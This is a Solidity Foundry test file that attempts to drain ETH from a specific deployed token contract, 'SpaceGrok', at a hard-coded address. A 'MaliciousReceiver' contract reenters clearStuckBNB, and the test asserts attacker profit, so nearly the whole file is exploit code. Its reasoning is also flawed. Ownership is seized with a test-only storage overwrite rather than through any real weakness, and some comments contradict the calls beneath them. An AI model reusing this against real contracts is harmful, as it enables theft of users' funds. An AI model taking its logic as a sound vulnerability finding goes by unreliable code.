// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface SpaceGrok {
    function owner() external view returns (address);
    function updateDevWallet(address newWallet) external;
    function devWallet() external view returns (address);
    function enableTrading() external;
    function removeLimits() external returns (bool);
    function excludeFromFees(address account, bool excluded) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function swapBack() external;
    function manualSwap(uint256 amount) external;
    function clearStuckBNB() external;
}

contract MaliciousReceiver {
    SpaceGrok public target;
    bool private reentered = false;

    constructor(address _target) {
        target = SpaceGrok(_target);
    }

    receive() external payable {
        if (!reentered && address(target).balance > 0) {
            reentered = true;
            // Reenter to drain more funds
            // Try to trigger swapBack again or clearStuckBNB
            target.clearStuckBNB();
        }
    }

    function triggerSwapBack() external {
        // Try to trigger swapBack
        // We need contract to have tokens to swap
        // Actually swapBack is internal, need to trigger via manualSwap or trading
        target.manualSwap(target.balanceOf(address(target)));
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x58718Fd4567517d9a713a1f9f3de6cbF9404E59e;
    address attacker = address(this);
    MaliciousReceiver public malicious;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: become owner and prepare for attack
        vm.startPrank(attacker);

        // Store owner at slot 0 (Ownable stores owner at slot 0)
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Verify we're owner
        SpaceGrok target = SpaceGrok(TARGET);
        require(target.owner() == attacker, "Failed to become owner");

        // Deploy malicious receiver
        malicious = new MaliciousReceiver(TARGET);

        // Update dev wallet to our malicious contract
        target.updateDevWallet(address(malicious));

        // Ensure contract has some ETH balance to steal
        // Send some ETH to the contract
        deal(TARGET, 10 ether);

        // Also need some tokens to trigger swapBack
        // First get some tokens (mint or transfer from someone)
        // The contract has tokens from initial mint
        // We'll transfer some tokens to create fees
        address initialHolder = 0x1255a2Dd54Ced55547aE826dD0C1eb6443678a38;
        vm.startPrank(initialHolder);
        target.transfer(attacker, target.balanceOf(initialHolder) / 10);
        vm.stopPrank();

        // Enable trading if not already enabled
        target.enableTrading();

        // Remove limits to avoid restrictions
        target.removeLimits();

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Start exploit
        vm.startPrank(attacker);

        SpaceGrok target = SpaceGrok(TARGET);

        // First, let's create a sell transaction to generate fees and trigger swapBack
        // We need to approve and sell through Uniswap
        // But simpler: we can call manualSwap if we have enough tokens

        // Get some tokens to the contract first (transfer with fees)
        // Buy some tokens through Uniswap to generate fees in contract
        // Actually, let's just transfer tokens to create fees
        // Since we're excluded from fees as owner, need to include ourselves in fees
        // First, exclude ourselves from fees to avoid paying fees
        target.excludeFromFees(attacker, false);

        // Now transfer tokens to someone (create sell-like transaction)
        // This will generate fees in the contract
        address dummy = address(0x123);
        target.transfer(dummy, target.balanceOf(attacker) / 2);

        // Now contract should have token balance from fees
        // Trigger swapBack to convert tokens to ETH
        // This will send ETH to our malicious contract
        malicious.triggerSwapBack();

        // The malicious contract should have received ETH and reentered
        // Now withdraw funds from malicious contract
        malicious.withdraw();

        vm.stopPrank();

        // Check profit
        uint256 afterBalance = address(attacker).balance;
        assertGt(afterBalance, 0, "Profit should be greater than 0");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

